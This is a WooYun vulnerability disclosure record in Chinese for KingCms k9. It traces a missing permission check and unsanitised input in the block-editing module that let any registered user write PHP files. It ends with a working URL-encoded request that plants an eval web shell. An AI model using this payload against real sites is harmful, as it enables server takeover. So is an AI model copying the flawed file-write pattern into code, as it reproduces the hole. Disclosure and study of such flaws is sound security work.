{"id": 35828, "wybug_id": "wooyun-2015-0103095", "wybug_title": "KingCms最新版前台又GetShell", "wybug_corp": "KingCms", "wybug_author": "路人甲", "wybug_date": "2015-03-24 14:52", "wybug_open_date": "2015-05-08 14:54", "wybug_type": "命令执行", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核", "任意文件写入利用"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-24：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-05-08：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： KingCms最新版前台又GetShell 详细说明：  朋友的公司想购买kingcms的授权，让我帮忙看下。发现kingcms很长一段时间没更新了，憋了一段时间放出了最新版的k9(2014-12-13更新)，官网下下来学习一下。在wooyun上看到了几个漏洞，如： WooYun: kingcms最新版sql注入漏洞 只需要普通用户就可以完成getshell问题出在这里：/apps/block/manage.php\nfunction _edit(){\t$u=new user;$u->auth_role('block_edit');\tif(empty($_POST['name'])) kc_tip('碎片名称不能为空!','form');\tif(!kc_validate($_POST['name'],'/^[a-z0-9\\_]+$/')) kc_tip('碎片名称只能由小写字母、数字和下划线组成!','form');\t$path=ROOT.T.'block/';\tif(empty($_POST['name_old'])){\t\tif(is_file($path.$_POST['name'])) kc_tip('已经存在同名的碎片!','form');\t}elseif(is_file($path.$_POST['name'] && $_POST['name']!=$_POST['name_old'])){\t\tkc_tip('已经存在同名的碎片!','form');\t}\t$s='<?php /**'.$_POST['notes'].'**/ ?><?php !defined(\\'INC\\') && exit(\"Illegal request!\");?>'.$_POST['text'];//注释2\t$file=new file;\t$file->put(T.'block/'.$_POST['name'].'.php',$s);\tkc_ajax(array('JS'=>\"go('{$_POST['HTTP_REFERER']}')\"));}\n这里有个权限验证$u->auth_role('block_edit');\t，我们去看看\npublic function auth_role($level=0,$is=false){\t\tif(empty($level)) return $this->info['islogin'];\t\tif($level==1 && !$this->info['islogin']) return $is ? false :kc_tip('请先登录!','form');\t\t//exit($this->info['islogin'].'ccc');\t\t\t\tif($is==true && strpos($level,'_deny')) return false;\t\t\t\tglobal $db;\t\t$res_rids=$db->getRows_two('%s_user_role_bind','rid','removedate','userid='.$this->info['userid']);\t\tif(empty($res_rids)) return false;//注释1：如果没有权限，返回false\t\t$rids=array_keys($res_rids);\t\t$rs=$db->getRows_two('%s_user_role_auth','auth','id','rid in ('.implode(',',$rids).')');\t\t\t\t/*\t\t$rs=$db->getRows_join('%s_user_role_auth','%s_user_role_bind','auth','rid','rid','t2.userid='.$this->info['userid'].' and t1.auth=\\''.$level.'\\'');\t\t */\t\tif(!empty($rs['admin'])) return true;\t\t//if(empty($rs[$level])) return $is ? false : kc_tip('您无权访问当前页!','form');\t\treturn empty($rs[$level]) ? ($is ? false : kc_tip('您无权访问当前页!','form')) : true;\t}\n看上面代码“注释1”处，如果用户没有相应的权限就返回false，但是在上面的第一段代码中，并没有判断是不是返回false啊，也没有exit()，也就是说返回true和返回false是一样的，没有判断，程序继续向下执行啊。注册的会员都可以操作这里。再看第一段代码的注释2处，直接把$_POST['notes']的内容进行了拼接，然后调用了$file->put(),跟进\nfunction put($filename,$s,$is=false){\t$filename=$this->encode($filename,1);\t$this->md(dirname($filename));//创建目录\t//去掉bom\tif(substr($s,0,3)==pack(\"CCC\",0xef,0xbb,0xbf)){\t\t$s=substr($s,3);\t}//exit($filename);\tif( file_put_contents(ROOT.$filename,$s,LOCK_EX) !== false ) {//写入成功\t\treturn true;\t}else{//写入失败\t\tif($is){\t\t\tkc_tip('文件写入失败!<br/>'.$filename);\t\t}\t}}\n仅对文件的名字调用了自定义的encode方法处理，对于写入文章的内容没有处理，这里是这样拼接的\n$s='<?php /**'.$_POST['notes'].'**/ ?><?php !defined(\\'INC\\') && exit(\"Illegal request!\");?>'.$_POST['text'];\n因此，$_POST['notes']的内容应该为：/?><?php eval($_POST[\"p\"]);/，然后URL编码即可。Payload:get提交，普通权限的用户即可操作\nGET /apps/block/manage.php?jsoncallback=1&_=1&CMD=edit&METHOD=POST&id=&AJAX=1&name=test&notes=%2f%3f%3e%3c%3fphp+eval(%24_POST%5b%22p%22%5d)%3b%2f\n提交过程如下图\n\n测试之\n\n   漏洞证明：  见 详细说明   修复方案：  验证   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}